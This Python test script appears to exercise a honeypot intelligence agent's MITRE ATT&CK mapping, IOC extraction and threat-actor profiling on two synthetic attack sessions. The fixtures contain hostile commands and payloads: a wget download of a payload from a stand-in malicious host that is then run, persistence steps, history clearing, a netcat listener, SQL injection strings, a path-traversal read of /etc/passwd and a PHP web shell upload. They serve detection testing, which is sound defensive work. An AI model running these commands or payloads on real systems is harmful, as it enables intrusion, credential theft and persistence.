#!/usr/bin/env python3
"""
Test script for MITRE ATT&CK mapping functionality
"""

import asyncio
import json
import logging
from datetime import datetime, timedelta
from agents.intelligence.mitre_mapper import MitreAttackMapper
from agents.intelligence.intelligence_agent import IntelligenceAgent

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_advanced_attack_session():
    """Create sample session data with advanced attack techniques"""
    base_time = datetime.utcnow()
    
    return {
        "session_id": "advanced-attack-001",
        "metadata": {
            "honeypot_type": "ssh",
            "source_ip": "203.0.113.42",
            "start_time": base_time.isoformat(),
            "end_time": (base_time + timedelta(minutes=25)).isoformat(),
            "duration_seconds": 1500,
            "user_agent": "OpenSSH_8.0"
        },
        "transcript": [
            {
                "timestamp": base_time.isoformat(),
                "type": "connection",
                "content": "SSH connection established"
            },
            {
                "timestamp": (base_time + timedelta(seconds=5)).isoformat(),
                "type": "command",
                "content": "whoami"
            },
            {
                "timestamp": (base_time + timedelta(seconds=10)).isoformat(),
                "type": "command",
                "content": "id"
            },
            {
                "timestamp": (base_time + timedelta(seconds=15)).isoformat(),
                "type": "command",
                "content": "uname -a"
            },
            {
                "timestamp": (base_time + timedelta(seconds=20)).isoformat(),
                "type": "command",
                "content": "ps aux"
            },
            {
                "timestamp": (base_time + timedelta(seconds=30)).isoformat(),
                "type": "command",
                "content": "netstat -an"
            },
            {
                "timestamp": (base_time + timedelta(seconds=45)).isoformat(),
                "type": "command",
                "content": "cat /etc/passwd"
            },
            {
                "timestamp": (base_time + timedelta(seconds=60)).isoformat(),
                "type": "command",
                "content": "sudo -l"
            },
            {
                "timestamp": (base_time + timedelta(seconds=90)).isoformat(),
                "type": "command",
                "content": "find /home -name '*.key' 2>/dev/null"
            },
            {
                "timestamp": (base_time + timedelta(seconds=120)).isoformat(),
                "type": "command",
                "content": "wget http://malicious-site.com/payload.sh"
            },
            {
                "timestamp": (base_time + timedelta(seconds=130)).isoformat(),
                "type": "command",
                "content": "chmod +x payload.sh"
            },
            {
                "timestamp": (base_time + timedelta(seconds=140)).isoformat(),
                "type": "command",
                "content": "./payload.sh"
            },
            {
                "timestamp": (base_time + timedelta(seconds=180)).isoformat(),
                "type": "command",
                "content": "crontab -e"
            },
            {
                "timestamp": (base_time + timedelta(seconds=200)).isoformat(),
                "type": "command",
                "content": "systemctl --user enable malware.service"
            },
            {
                "timestamp": (base_time + timedelta(seconds=240)).isoformat(),
                "type": "command",
                "content": "history -c"
            },
            {
                "timestamp": (base_time + timedelta(seconds=250)).isoformat(),
                "type": "command",
                "content": "rm payload.sh"
            },
            {
                "timestamp": (base_time + timedelta(seconds=300)).isoformat(),
                "type": "command",
                "content": "nc -l -p 4444"
            }
        ]
    }

def create_web_attack_session():
    """Create sample web attack session with SQL injection"""
    base_time = datetime.utcnow()
    
    return {
        "session_id": "web-attack-001", 
        "metadata": {
            "honeypot_type": "web_admin",
            "source_ip": "198.51.100.25",
            "start_time": base_time.isoformat(),
            "end_time": (base_time + timedelta(minutes=15)).isoformat(),
            "duration_seconds": 900,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "transcript": [
            {
                "timestamp": base_time.isoformat(),
                "type": "http_request",
                "content": "GET /admin/login.php HTTP/1.1"
            },
            {
                "timestamp": (base_time + timedelta(seconds=10)).isoformat(),
                "type": "http_request",
                "content": "POST /admin/login.php HTTP/1.1\nContent: username=admin&password=admin123"
            },
            {
                "timestamp": (base_time + timedelta(seconds=20)).isoformat(),
                "type": "http_request",
                "content": "GET /admin/users.php?id=1' UNION SELECT 1,username,password,4 FROM admin_users-- HTTP/1.1"
            },
            {
                "timestamp": (base_time + timedelta(seconds=35)).isoformat(),
                "type": "http_request",
                "content": "GET /admin/users.php?id=1' OR 1=1-- HTTP/1.1"
            },
            {
                "timestamp": (base_time + timedelta(seconds=50)).isoformat(),
                "type": "http_request",
                "content": "GET /admin/config.php?file=../../../etc/passwd HTTP/1.1"
            },
            {
                "timestamp": (base_time + timedelta(seconds=70)).isoformat(),
                "type": "http_request",
                "content": "POST /admin/upload.php HTTP/1.1\nContent: file=shell.php&content=<?php system($_GET['cmd']); ?>"
            },
            {
                "timestamp": (base_time + timedelta(seconds=90)).isoformat(),
                "type": "http_request",
                "content": "GET /uploads/shell.php?cmd=whoami HTTP/1.1"
            }
        ]
    }

async def test_mitre_mapper():
    """Test the MitreAttackMapper class"""
    logger.info("Testing MITRE ATT&CK Mapper...")
    
    mapper = MitreAttackMapper()
    
    # Test technique mapping
    logger.info("Testing technique mapping...")
    advanced_session = create_advanced_attack_session()
    techniques = mapper.map_techniques_from_session(advanced_session)
    
    logger.info(f"Mapped {len(techniques)} techniques:")
    for technique in techniques:
        logger.info(f"  - {technique.get('technique_id', 'Unknown')}: {technique.get('technique_name', 'Unknown')} "
                   f"(Tactic: {technique.get('tactic', 'Unknown')}, Confidence: {technique.get('confidence', 0):.2f})")
    
    # Test IOC extraction
    logger.info("\nTesting IOC extraction...")
    iocs = mapper.extract_and_validate_iocs(advanced_session)
    
    logger.info(f"Extracted {len(iocs)} IOCs:")
    for ioc in iocs:
        logger.info(f"  - {ioc.get('type', 'Unknown')}: {ioc.get('value', 'Unknown')} "
                   f"(Confidence: {ioc.get('confidence', 0):.2f})")
    
    # Test threat actor profiling
    logger.info("\nTesting threat actor profiling...")
    threat_profile = mapper.profile_threat_actor(techniques, advanced_session.get("metadata", {}))
    
    logger.info(f"Threat Actor Assessment:")
    logger.info(f"  Confidence Level: {threat_profile.get('confidence_level', 'Unknown')}")
    logger.info(f"  Assessment: {threat_profile.get('assessment_summary', 'No assessment')}")
    
    top_matches = threat_profile.get("top_matches", [])
    if top_matches:
        logger.info("  Top Matches:")
        for actor_name, match_data in top_matches[:3]:
            logger.info(f"    - {actor_name}: {match_data.get('adjusted_score', 0):.2f}")
    
    # Test comprehensive MITRE report
    logger.info("\nTesting comprehensive MITRE report generation...")
    mitre_report = mapper.generate_mitre_report(techniques, iocs, threat_profile)
    
    logger.info("MITRE Report Summary:")
    exec_summary = mitre_report.get("executive_summary", {})
    logger.info(f"  Total Techniques: {exec_summary.get('total_techniques', 0)}")
    logger.info(f"  Unique Tactics: {exec_summary.get('unique_tactics', 0)}")
    logger.info(f"  Total IOCs: {exec_summary.get('total_iocs', 0)}")
    logger.info(f"  Sophistication Level: {exec_summary.get('sophistication_level', 'Unknown')}")
    
    # Test web attack mapping
    logger.info("\nTesting web attack mapping...")
    web_session = create_web_attack_session()
    web_techniques = mapper.map_techniques_from_session(web_session)
    
    logger.info(f"Web Attack Techniques ({len(web_techniques)}):")
    for technique in web_techniques:
        logger.info(f"  - {technique.get('technique_id', 'Unknown')}: {technique.get('technique_name', 'Unknown')} "
                   f"(Attack Type: {technique.get('attack_type', 'Unknown')})")

async def test_intelligence_agent_mitre_integration():
    """Test Intelligence Agent with MITRE integration"""
    logger.info("\nTesting Intelligence Agent MITRE Integration...")
    
    # Initialize agent
    config = {
        "analysis": {
            "confidence_threshold": 0.5,
            "max_concurrent_analyses": 3
        }
    }
    
    agent = IntelligenceAgent(config)
    
    try:
        # Start agent
        await agent.start()
        
        # Test MITRE analysis message
        advanced_session = create_advanced_attack_session()
        
        mitre_message = {
            "type": "mitre_analysis",
            "session_data": advanced_session
        }
        
        logger.info("Testing MITRE analysis message...")
        mitre_result = await agent.process_message(mitre_message)
        
        if mitre_result.get("status") == "success":
            mitre_analysis = mitre_result.get("mitre_analysis", {})
            logger.info(f"MITRE Analysis Results:")
            logger.info(f"  Techniques: {len(mitre_analysis.get('techniques', []))}")
            logger.info(f"  IOCs: {len(mitre_analysis.get('iocs', []))}")
            
            threat_profile = mitre_analysis.get("threat_profile", {})
            logger.info(f"  Threat Actor Confidence: {threat_profile.get('confidence_level', 'Unknown')}")
        else:
            logger.error(f"MITRE analysis failed: {mitre_result.get('error', 'Unknown error')}")
        
        # Test threat actor profiling message
        logger.info("\nTesting threat actor profiling message...")
        
        profiling_message = {
            "type": "threat_actor_profiling",
            "techniques": mitre_analysis.get("techniques", [])[:5],  # Use first 5 techniques
            "session_metadata": advanced_session.get("metadata", {})
        }
        
        profiling_result = await agent.process_message(profiling_message)
        
        if profiling_result.get("status") == "success":
            profile = profiling_result.get("threat_actor_profile", {})
            logger.info(f"Threat Actor Profiling Results:")
            logger.info(f"  Confidence: {profile.get('confidence_level', 'Unknown')}")
            logger.info(f"  Top Matches: {len(profile.get('top_matches', []))}")
        else:
            logger.error(f"Threat actor profiling failed: {profiling_result.get('error', 'Unknown error')}")
        
        # Test IOC extraction message
        logger.info("\nTesting IOC extraction message...")
        
        ioc_message = {
            "type": "ioc_extraction",
            "session_data": advanced_session
        }
        
        ioc_result = await agent.process_message(ioc_message)
        
        if ioc_result.get("status") == "success":
            ioc_summary = ioc_result.get("summary", {})
            logger.info(f"IOC Extraction Results:")
            logger.info(f"  Total IOCs: {ioc_summary.get('total_iocs', 0)}")
            logger.info(f"  High Confidence IOCs: {ioc_summary.get('high_confidence_iocs', 0)}")
            logger.info(f"  IOC Types: {ioc_summary.get('ioc_types', [])}")
        else:
            logger.error(f"IOC extraction failed: {ioc_result.get('error', 'Unknown error')}")
        
        # Test MITRE statistics
        logger.info("\nTesting MITRE statistics...")
        stats = await agent.get_mitre_statistics("24h")
        
        if stats.get("status") == "success":
            statistics = stats.get("statistics", {})
            logger.info(f"MITRE Statistics:")
            logger.info(f"  Total Sessions: {statistics.get('total_sessions', 0)}")
            logger.info(f"  Total Techniques: {statistics.get('total_techniques', 0)}")
            logger.info(f"  Unique Techniques: {statistics.get('unique_techniques', 0)}")
            logger.info(f"  Unique Tactics: {statistics.get('unique_tactics', 0)}")
        else:
            logger.error(f"MITRE statistics failed: {stats.get('error', 'Unknown error')}")
        
    finally:
        # Stop agent
        await agent.stop()

async def main():
    """Main test function"""
    logger.info("Starting MITRE ATT&CK Mapping Tests")
    
    try:
        # Test MITRE mapper
        await test_mitre_mapper()
        
        print("\n" + "="*60 + "\n")
        
        # Test Intelligence Agent MITRE integration
        await test_intelligence_agent_mitre_integration()
        
        logger.info("All MITRE mapping tests completed successfully!")
        
    except Exception as e:
        logger.error(f"Test failed: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())